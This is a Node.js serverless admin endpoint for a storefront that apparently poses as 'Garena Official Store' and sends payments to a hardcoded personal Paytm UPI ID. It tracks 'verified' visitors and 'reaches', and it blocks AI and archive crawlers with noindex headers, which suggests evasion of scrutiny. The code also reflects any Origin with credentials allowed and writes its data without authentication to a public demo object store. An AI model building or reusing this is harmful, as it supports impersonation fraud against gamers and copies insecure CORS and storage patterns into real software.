// ============================================================
// PROTECTED SERVERLESS API — api/admin-config.js
// Admin Control Panel Data & Actions Endpoint.
// STRICT SECURITY: Requires valid JWT HttpOnly Cookie or Bearer Token.
// Rejects unauthenticated requests with HTTP 401.
// ============================================================

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const https = require("https");

const JWT_SECRET = process.env.JWT_SECRET;
const TMP_STORE_FILE = path.join("/tmp", "admin_store.json");
const LOCAL_STORE_FILE = path.join(__dirname, "..", "db.json");
const CLOUD_KV_URL = process.env.UPSTASH_REDIS_REST_URL || "https://api.restful-api.dev/objects/ff808181a061cdc401a0661f02fd0dee";

function verifyAdminJWT(token) {
  if (!JWT_SECRET || !token) return null;
  try {
    const parts = token.split(".");
    if (parts.length !== 3) return null;
    const header = parts[0];
    const body = parts[1];
    const sig = parts[2];
    const expected = crypto.createHmac("sha256", JWT_SECRET).update(header + "." + body).digest("base64url");
    if (sig.length !== expected.length) return null;
    if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))) return null;
    const payload = JSON.parse(Buffer.from(body, "base64url").toString());
    if (payload.exp && Date.now() / 1000 > payload.exp) return null;
    return payload;
  } catch (e) { return null; }
}

function getTokenFromReq(req) {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(/(?:^|;\s*)admin_token=([^;]+)/);
  if (match) return match[1];
  const auth = req.headers["authorization"] || "";
  if (auth.startsWith("Bearer ")) return auth.slice(7);
  return null;
}

function getRawBody(req) {
  return new Promise((resolve) => {
    let data = "";
    req.on("data", c => data += c);
    req.on("end", () => resolve(data));
    req.on("error", () => resolve(""));
  });
}

function readLocalDisk() {
  try {
    if (fs.existsSync(TMP_STORE_FILE)) {
      const d = fs.readFileSync(TMP_STORE_FILE, "utf8");
      if (d && d.trim().startsWith("{")) return JSON.parse(d);
    }
    if (fs.existsSync(LOCAL_STORE_FILE)) {
      const d = fs.readFileSync(LOCAL_STORE_FILE, "utf8");
      if (d && d.trim().startsWith("{")) return JSON.parse(d);
    }
  } catch (e) {}
  return null;
}

function writeLocalDisk(state) {
  try {
    fs.writeFileSync(TMP_STORE_FILE, JSON.stringify(state, null, 2), "utf8");
  } catch (e) {}
}

function getPersistableState(state) {
  if (!state || typeof state !== "object") return {};
  return {
    upiId: state.upiId || process.env.UPI_DEFAULT || "paytm.s2sr8jx@pty",
    merchantName: state.merchantName || "Garena Official Store",
    supportChatEnabled: state.supportChatEnabled !== false,
    products: Array.isArray(state.products) ? state.products : [],
    banners: Array.isArray(state.banners) ? state.banners : [],
    gameLogo: state.gameLogo || "logo.png",
    gameIcon: state.gameIcon || "ff_game_icon.png"
  };
}

function loadCloudKV() {
  return new Promise((resolve) => {
    try {
      https.get(CLOUD_KV_URL, (res) => {
        let raw = "";
        res.on("data", chunk => raw += chunk);
        res.on("end", () => {
          try {
            if (raw && raw.trim().startsWith("{")) {
              const parsed = JSON.parse(raw);
              const remote = (parsed && parsed.data) ? parsed.data : parsed;
              if (remote && typeof remote === "object") { resolve(remote); return; }
            }
          } catch (e) {}
          resolve(null);
        });
      }).on("error", () => resolve(null));
    } catch (e) { resolve(null); }
  });
}

function writeCloudKV(state) {
  try {
    const leanState = getPersistableState(state);
    const payload = JSON.stringify({ name: "garena_topup_db_v2", data: leanState });
    const u = new URL(CLOUD_KV_URL);
    const req = https.request(u, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload)
      }
    });
    req.on("error", () => {});
    req.write(payload);
    req.end();
  } catch (e) {}
}

function sanitizeState(state) {
  if (!state || typeof state !== "object") return {};
  const safe = Object.assign({}, state);
  delete safe.adminPassHash;
  delete safe.adminPass;
  delete safe.password;
  if (Array.isArray(safe.affiliates)) {
    safe.affiliates = safe.affiliates.map(a => { const c = Object.assign({}, a); delete c.passwordHash; return c; });
  }
  return safe;
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*");
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
  res.setHeader("X-Frame-Options", "DENY");

  if (req.method === "OPTIONS") return res.status(200).end();

  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const BOT_PATTERNS = ["gptbot","chatgpt","claudebot","anthropic-ai","perplexitybot","google-extended","ccbot","bytespider","diffbot","facebookexternalhit","amazonbot","ia_archiver","semrushbot","ahrefsbot","mj12bot","dotbot","scrapy","python-requests"];
  if (BOT_PATTERNS.some(p => ua.includes(p))) {
    return res.status(403).json({ error: "Access Denied" });
  }

  // ── STRICT AUTHENTICATION GUARD ──
  const token = getTokenFromReq(req);
  const adminSession = verifyAdminJWT(token);

  if (!adminSession) {
    return res.status(401).json({
      success: false,
      error: "Unauthorized: Missing, expired or invalid session token. Please log in."
    });
  }

  let state = readLocalDisk() || {};
  const cloud = await loadCloudKV();
  if (cloud && typeof cloud === "object") {
    state = Object.assign({}, state, cloud);
  }

  if (req.method === "GET") {
    return res.status(200).json({
      success: true,
      admin: adminSession.admin,
      state: sanitizeState(state)
    });
  }

  if (req.method === "POST") {
    let body = {};
    try { body = JSON.parse(await getRawBody(req)); } catch (e) {}

    const action = body.action || "update_full_store";

    if (action === "update_full_store") {
      if (body.upiId) state.upiId = body.upiId;
      if (body.merchantName) state.merchantName = body.merchantName;
      if (Array.isArray(body.products)) state.products = body.products;
      if (Array.isArray(body.banners)) state.banners = body.banners;
      if (body.supportChatEnabled !== undefined) state.supportChatEnabled = (body.supportChatEnabled === true || body.supportChatEnabled === "true");
    } else if (action === "update_support_chat") {
      state.supportChatEnabled = (body.enabled === true || body.enabled === "true");
    } else if (action === "update_products") {
      if (Array.isArray(body.products)) state.products = body.products;
    } else if (action === "reset_stats") {
      state.visits = 0;
      state.verified = 0;
      state.reaches = 0;
      state.pageViews = 0;
      state.activityLogs = [];
      state.dailyTraffic = {};
    } else if (action === "update_ticket_status") {
      state.supportTickets = state.supportTickets || [];
      const ticket = state.supportTickets.find(t => t.caseId === body.caseId);
      if (ticket) {
        if (body.status) ticket.status = body.status;
        if (body.adminReply) ticket.adminReply = body.adminReply;
      }
    }

    writeLocalDisk(state);
    writeCloudKV(state);

    return res.status(200).json({
      success: true,
      message: "Admin settings updated and persisted successfully.",
      state: sanitizeState(state)
    });
  }

  return res.status(405).json({ error: "Method not allowed" });
};
